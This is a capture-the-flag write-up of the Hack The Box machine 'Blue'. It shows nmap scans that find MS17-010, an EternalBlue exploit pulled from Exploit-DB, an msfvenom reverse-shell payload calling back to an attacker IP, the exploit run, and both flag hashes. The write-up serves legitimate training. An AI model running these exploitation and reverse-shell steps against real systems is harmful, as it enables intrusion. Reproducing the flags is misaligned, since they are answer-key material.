---
title: Blue
date: 2022-06-06 22:25:00
author: 0xma
img: /medias/images/blue/Untitled.png
categories: 
  - hackthebox
  - windows
tags: 
  - htb-blue
  - hackthebox
  - ctf
  - nmap
  - nmap-scripts
  - smbmap
  - smbclient
  - metasploit
  - ms17-010
  - eternalblue
  - meterpreter
  - impacket
  - virtualenv
---
# [Easy] Blue

![Untitled](/medias/images/blue/Untitled.png)

## Reconnaissance

nmap result

```bash
sudo nmap -sC -sV -O -oA scans/initial blue.htb                                                                               1 ⚙
[sudo] password for kali: 

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 23:13 EDT
Nmap scan report for 10.129.252.111
Host is up (0.19s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/4%OT=135%CT=1%CU=35074%PV=Y%DS=2%DC=I%G=Y%TM=6184A1
OS:C9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%TS=7)SEQ(SP=
OS:102%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=102%GCD=1%ISR=10A%TI=I
OS:%II=I%SS=S%TS=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54
OS:DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=
OS:Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q
OS:=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%
OS:A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%
OS:DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2021-11-05T03:15:13
|_  start_date: 2021-11-05T02:22:05
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-11-05T03:15:11+00:00
|_clock-skew: mean: 1s, deviation: 1s, median: 1s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.24 seconds
```

- **Port 139:** running Microsoft Windows netbiois-ssn
- **Port 445:** running microsoft-ds
- **Ports 135, 49152, 49153, 49154, 49155, 49156 & 49157:** running msrpc

UDP Scan

```bash
nmap -sU -O -p- -oA scans/udp blue.htb
```

## Enumeration

```bash
nmap --script vuln -oA scans/vuln 10.129.252.111                                                                                                130 ⨯ 1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 23:23 EDT
Nmap scan report for blue.htb (10.129.252.111)
Host is up (0.19s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Nmap done: 1 IP address (1 host up) scanned in 135.43 seconds
```

The box is vulnerable to EternalBlue! And guess what the EternalBlue exploit does? It gives me system access, so this box won’t be too difficult to solve. If you’re not familiar with EternalBlue, it exploits Microsoft’s implementation of the Server Message Block (SMB) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to execute arbitrary code on the target machine.

## Exploitation

Search for a non Metasploit exploit in the Exploit Database.

```bash
searchsploit --id MS17-010                                                                                                                            1 ⚙
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  EDB-ID
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)   | 43970
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                               | 41891
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                            | 42031
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                        | 42315
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                  | 42030
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                               | 41987
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We’re working with Windows 7 so we’ll use exploit # 42315. Clone the exploit into the working directory.

```bash
searchsploit -m 42315                                                                                                                                 1 ⚙
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/Documents/CTF/HackTheBox/Machine/Windows/Easy/Blue/42315.py
```

After looking at the source code, we need to do three things:

1. Download mysmb.py since the exploit imports it. The download location is included in the exploit.
2. Use MSFvenom to create a reverse shell payload (allowed on the OSCP as long as you’re not using meterpreter).
3. Make changes in the exploit to add the authentication credentials and the reverse shell payload.

First, download the file and rename it to mysmb.py

```bash
wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
mv 42315.py.1 mysmb.py
```

Second, use MSFvenom to generate a simple executable with a reverse shell payload.

```bash
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.14 LPORT=4242 > eternal-blue.exe
```

Third, we need change the exploit to add credentials. In our case we don’t have valid credentials, however, let’s check to see if guest login is allowed.

If you run enum4linux, you can see that guest login is supported.

```bash
enum4linux -a 10.129.252.111                                                                                                                    130 ⨯ 1 ⚙
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Nov  4 23:34:41 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.252.111
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
```

We’ll add that to the exploit script. [[42315.py](http://42315.py/)]

![Untitled](/medias/images/blue/Untitled%201.png)

Similarly, we’ll add the reverse shell executable location and get the script to execute it.

![Untitled](/medias/images/blue/Untitled%202.png)

Now that we’re done all three tasks, setup a listener on your attack machine.

![Untitled](/medias/images/blue/Untitled%203.png)

```bash
pip2 install pyasn1
pip2 install pycryptodomex
```

and run exploit

```bash
python2 42315.py 10.129.252.111
```

![Untitled](/medias/images/blue/Untitled%204.png)

![Untitled](/medias/images/blue/Untitled%205.png)

### user.txt = 4c546aea7dbee75cbd71de245c8deea9

### root.txt = ff548eb71e920ff6c08843ce9df4e717

## Lesson Learned

I keep repeating this in most of my HTB writeup blogs and I’ll say it again, it goes without saying that you should always update your systems **especially** when updates are released for critical vulnerabilities! If the system administrator had installed the MS17–010 security update, I would have had to find another way to exploit this machine.